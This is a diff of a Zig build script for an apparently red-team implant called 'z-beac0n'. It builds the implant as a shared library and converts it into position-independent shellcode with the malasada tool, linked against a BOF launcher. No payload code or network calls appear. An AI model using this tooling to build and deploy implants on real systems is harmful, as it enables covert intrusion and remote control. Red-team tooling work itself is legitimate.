@@ -41,9 +41,51 @@ pub fn build(b: *std.Build) void {
     b.installArtifact(exe);
 
     //
-    // z-beac0n implant: stageless payload (shellcode)
+    // z-beac0n implant: stageless payload (shared library)
     //
-    const shellcode_name = b.fmt("shellcode_binary_temp_{s}_{s}", .{ osTagStr(target), cpuArchStr(target) });
+    const shared_name = b.fmt("z-beac0n_{s}_{s}", .{ osTagStr(target), cpuArchStr(target) });
+
+    const shared_lib = b.addLibrary(.{
+        .name = shared_name,
+        .linkage = .dynamic,
+        .root_module = b.createModule(.{
+            .root_source_file = b.path("src/shared.zig"),
+            .target = target,
+            .optimize = optimize,
+            .link_libc = target.result.os.tag == .linux,
+        }),
+    });
+
+    shared_lib.root_module.linkLibrary(bof_launcher_lib);
+    shared_lib.root_module.addImport("bof_launcher_api", bof_launcher_api_module);
+    shared_lib.root_module.addAnonymousImport("z_beacon_embed", .{
+        .root_source_file = z_beacon.getEmittedBin(),
+    });
+
+    const shared_install = b.addInstallArtifact(shared_lib,
+        .{
+            .dest_dir = .{ .override = .{ .custom = "lib/" } },
+            .dest_sub_path = b.fmt("{s}.so", .{shared_name}),
+        });
+    b.getInstallStep().dependOn(&shared_install.step);
+
+
+    //
+    // z-beac0n implant: stageless payload (malasada-based shellcode variant)
+    //
+
+    // run malasada: https://github.com/sliverarmory/malasada - it converts provided so to executable shellcode
+    const malasada_run = b.addSystemCommand(&.{
+        "bin/malasada",
+        "--call-export",
+        "launch",
+        b.fmt("zig-out/lib/" ++ "lib" ++ "{s}.so", .{shared_name}),
+        "-o",
+        b.fmt("examples/implant/src/{s}" ++ ".so.bin", .{shared_name}),
+    });
+    malasada_run.step.dependOn(&shared_install.step);
+
+    const shellcode_name = b.fmt("temp_implant_{s}_{s}", .{ osTagStr(target), cpuArchStr(target) });
     const shellcode = b.addExecutable(.{
         .name = shellcode_name,
         .root_module = b.createModule(.{
@@ -60,40 +102,20 @@ pub fn build(b: *std.Build) void {
     shellcode.use_llvm = true;
     shellcode.pie = true;
     shellcode.setLinkerScript(shellcode_in_zig_dep.path("src/linker.ld"));
-    shellcode.root_module.addAnonymousImport("implant_executable_embed", .{
-        .root_source_file = exe.getEmittedBin(),
+    // add output of the malasada (i.e. so converted to shellcode) to the Zig-based shellcode for pre-processing and execution
+    shellcode.root_module.addAnonymousImport("implant_shellcode_embed", .{
+        .root_source_file = b.path(b.fmt("src/{s}" ++ ".so.bin", .{shared_name})),
     });
-    shellcode.step.dependOn(&exe.step);
+    shellcode.step.dependOn(&shared_install.step);
+    shellcode.step.dependOn(&malasada_run.step);
 
     b.installArtifact(shellcode);
 
-    const copy = b.addObjCopy(shellcode.getEmittedBin(), .{ .format = .bin, .only_section = ".text" });
-    const install = b.addInstallBinFile(copy.getOutput(), b.fmt("z-beac0n_{s}_{s}.bin", .{
+    const copy2 = b.addObjCopy(shellcode.getEmittedBin(), .{ .format = .bin, .only_section = ".text" });
+    const install2 = b.addInstallBinFile(copy2.getOutput(), b.fmt("z-beac0n_{s}_{s}.bin", .{
         osTagStr(target),
         cpuArchStr(target),
     }));
-    b.getInstallStep().dependOn(&install.step);
-
-    //
-    // z-beac0n implant: stageless payload (shared library)
-    //
-    const shared_lib = b.addLibrary(.{
-        .name = b.fmt("z-beac0n_{s}_{s}", .{ osTagStr(target), cpuArchStr(target) }),
-        .linkage = .dynamic,
-        .root_module = b.createModule(.{
-            .root_source_file = b.path("src/shared.zig"),
-            .target = target,
-            .optimize = optimize,
-            .link_libc = target.result.os.tag == .linux,
-        }),
-    });
-
-    shared_lib.root_module.linkLibrary(bof_launcher_lib);
-    shared_lib.root_module.addImport("bof_launcher_api", bof_launcher_api_module);
-    shared_lib.root_module.addAnonymousImport("z_beacon_embed", .{
-        .root_source_file = z_beacon.getEmittedBin(),
-    });
-
-    b.installArtifact(shared_lib);
+    b.getInstallStep().dependOn(&install2.step);
 
 }
